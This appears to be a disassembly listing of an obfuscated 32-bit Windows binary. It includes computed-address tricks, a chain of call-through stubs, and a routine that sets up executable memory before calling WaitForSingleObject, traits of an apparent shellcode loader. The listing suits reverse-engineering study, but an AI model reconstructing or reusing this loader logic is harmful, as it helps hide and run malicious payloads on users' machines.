0x00401020:	jb	0x00401048	; targets: 0x00401026(MAY), 0x00401048(MAY)	; from: 0x004010ed(MAY)
0x00401026:	addb	%al, (%eax)	; from: 0x00401020(MAY)
0x00401028:	addb	%al, (%eax)
0x0040102a:	addb	%al, (%eax)
0x0040102c:	addb	%al, (%eax)
0x0040102e:	addb	%al, (%eax)
0x00401030:	addb	%al, (%eax)
0x00401032:	addb	%al, (%eax)
0x00401034:	addb	%al, (%eax)
0x00401036:	addb	%al, (%eax)
0x00401038:	addb	%al, (%eax)
0x0040103a:	addb	%al, (%eax)
0x0040103c:	addb	%al, (%eax)
0x0040103e:	addb	%al, (%eax)
0x00401040:	addb	%al, (%eax)
0x00401042:	addb	%al, (%eax)
0x00401044:	addb	%al, (%eax)
0x00401046:	addb	%al, (%eax)
0x00401048:	movl	%edi, %edi	; from: 0x00401020(MAY)
0x0040104a:	pusha	
0x0040104b:	pushl	%ebp
0x0040104c:	movl	%esp, %ebp
0x0040104e:	subl	$0x60, %esp
0x00401051:	pushl	%ebx
0x00401052:	pushl	%edx
0x00401053:	pushl	%ecx
0x00401054:	pushl	(%ebx)
0x00401056:	call	0x004013e4	; targets: 0x004013e4(MAY)

start:
0x004010b8:	andb	$0x0, %al
0x004010ba:	movzbl	%al, %eax
0x004010bd:	pushl	%eax
0x004010be:	pushl	$0x402096
0x004010c3:	popl	%edi
0x004010c4:	adcl	$0x403002, (%esp)
0x004010cb:	pushw	(%edi)
0x004010ce:	popw	%ax
0x004010d0:	roll	$0x10, %eax
0x004010d3:	pushl	0x3a(%eax)
0x004010d6:	popl	%edx
0x004010d7:	shrl	$0x10, %edx
0x004010da:	addl	$0x1d, %edx
0x004010dd:	addl	%eax, %edx
0x004010df:	cmpb	$0x3a, (%edx)
0x004010e2:	jb	0x004010f2	; targets: 0x004010f2(MAY), 0x004010e4(MAY)
0x004010e4:	xorl	%eax, %eax	; from: 0x004010e2(MAY)
0x004010e6:	cmpb	$0x55, (%eax,%edx)
0x004010ea:	ja	0x004010f2	; targets: 0x004010ec(MAY), 0x004010f2(MAY)
0x004010ec:	popl	%ebx	; from: 0x004010ea(MAY)
0x004010ed:	jmp	0x00401020	; targets: 0x00401020(MAY)
0x004010f2:	popl	%ecx	; from: 0x004010e2(MAY), 0x004010ea(MAY)
0x004010f3:	addb	%al, (%eax)
0x004010f5:	addb	%dh, 0x43(%edi)
0x004010fb:	addb	%al, (%eax)
0x004010fd:	addb	%al, (%eax)
0x004010ff:	addb	%al, (%eax)
0x00401101:	addb	%al, (%eax)
0x00401103:	addb	%al, (%eax)
0x00401105:	addb	%al, (%eax)
0x00401107:	addb	%al, (%eax)
0x00401109:	addb	%al, (%eax)
0x0040110b:	addb	%al, (%eax)
0x0040110d:	addb	%al, (%eax)
0x0040110f:	addb	%al, (%eax)
0x00401111:	addb	%al, (%eax)
0x00401113:	addb	%al, (%eax)
0x00401115:	addb	%al, (%eax)
0x00401117:	addb	%al, (%eax)
0x00401119:	addb	%al, (%eax)
0x0040111b:	addb	%al, (%eax)
0x0040111d:	addb	%al, (%eax)
0x0040111f:	addb	%al, (%eax)
0x00401121:	addb	%al, (%eax)
0x00401123:	addb	%al, (%eax)
0x00401125:	addb	%al, (%eax)
0x00401127:	addb	%cl, -326412801(%ebx)
0x00401128:	movl	%edi, %edi	; from: 0x0040128b(MAY)
0x0040112a:	pushl	%ebp
0x0040112b:	movl	%esp, %ebp
0x0040112d:	subl	$0x58, %esp
0x00401130:	pushl	%ebx
0x00401131:	pushl	%edx
0x00401132:	pushl	%ecx
0x00401133:	pushl	%ecx
0x00401134:	pushl	(%ebx)
0x00401136:	call	0x0040124c	; targets: 0x0040124c(MAY)
0x004011bc:	movl	%edi, %edi	; from: 0x004013a1(MAY)
0x004011be:	movl	%esp, %ebp
0x004011c0:	subl	$0x20, %esp
0x004011c3:	movl	$0x40, %edi
0x004011c8:	pushl	%edi
0x004011c9:	movl	$0x1000, %edx
0x004011ce:	pushl	%edx
0x004011cf:	movl	$0x6c0, %esi
0x004011d4:	pushl	%esi
0x004011d5:	pushl	$0x0
0x004011d7:	pushl	$0xffffffff
0x004011d9:	leal	0x56ba439d, %esi
0x004011df:	subl	$0x567a2391, %esi
0x004011e5:	pushl	(%esi)
0x004011e7:	pushl	$0x402010
0x004011ec:	popl	%esi
0x004011ed:	popl	(%esi)
0x004011ef:	decl	(%esi)
0x004011f1:	movl	WaitForSingleObject@kernel32.dll, %eax
0x004011f6:	call	%eax	; targets: 0xff00009f(MAY)
0x0040124c:	movl	%edi, %edi	; from: 0x00401136(MAY)
0x0040124e:	pushl	%ebp
0x0040124f:	movl	%esp, %ebp
0x00401251:	subl	$0x60, %esp
0x00401254:	pushl	%ebx
0x00401255:	pushl	%esi
0x00401256:	pushl	(%ebx)
0x00401258:	call	0x00401394	; targets: 0x00401394(MAY)
0x0040127c:	movl	%edi, %edi	; from: 0x00401423(MAY)
0x0040127e:	pushl	%ebp
0x0040127f:	movl	%esp, %ebp
0x00401281:	subl	$0x2c, %esp
0x00401284:	pushl	%ebx
0x00401285:	pushl	%eax
0x00401286:	pushl	(%ebx)
0x00401288:	pushl	%eax
0x00401289:	pushl	(%ebx)
0x0040128b:	call	0x00401128	; targets: 0x00401128(MAY)
0x00401350:	movl	%edi, %edi	; from: 0x004013f1(MAY)
0x00401352:	pushl	%ebp
0x00401353:	movl	%esp, %ebp
0x00401355:	subl	$0x54, %esp
0x00401358:	pushl	%ebx
0x00401359:	pushl	%edx
0x0040135a:	pushl	(%ebx)
0x0040135c:	pushl	(%ebx)
0x0040135e:	call	0x00401414	; targets: 0x00401414(MAY)
0x00401394:	movl	%edi, %edi	; from: 0x00401258(MAY)
0x00401396:	pushl	%ebp
0x00401397:	movl	%esp, %ebp
0x00401399:	subl	$0x30, %esp
0x0040139c:	pushl	%ebx
0x0040139d:	pushl	%edi
0x0040139e:	pushl	(%ebx)
0x004013a0:	pushl	%esi
0x004013a1:	call	0x004011bc	; targets: 0x004011bc(MAY)
0x004013e4:	movl	%edi, %edi	; from: 0x00401056(MAY)
0x004013e6:	pushl	%ebp
0x004013e7:	movl	%esp, %ebp
0x004013e9:	subl	$0x34, %esp
0x004013ec:	pushl	%ebx
0x004013ed:	pushl	(%ebx)
0x004013ef:	pushl	(%ebx)
0x004013f1:	call	0x00401350	; targets: 0x00401350(MAY)
0x00401414:	movl	%edi, %edi	; from: 0x0040135e(MAY)
0x00401416:	pushl	%ebp
0x00401417:	movl	%esp, %ebp
0x00401419:	subl	$0x34, %esp
0x0040141c:	pushl	%ebx
0x0040141d:	pushl	(%ebx)
0x0040141f:	pushl	(%ebx)
0x00401421:	pushl	%ecx
0x00401422:	pushl	%ecx
0x00401423:	call	0x0040127c	; targets: 0x0040127c(MAY)
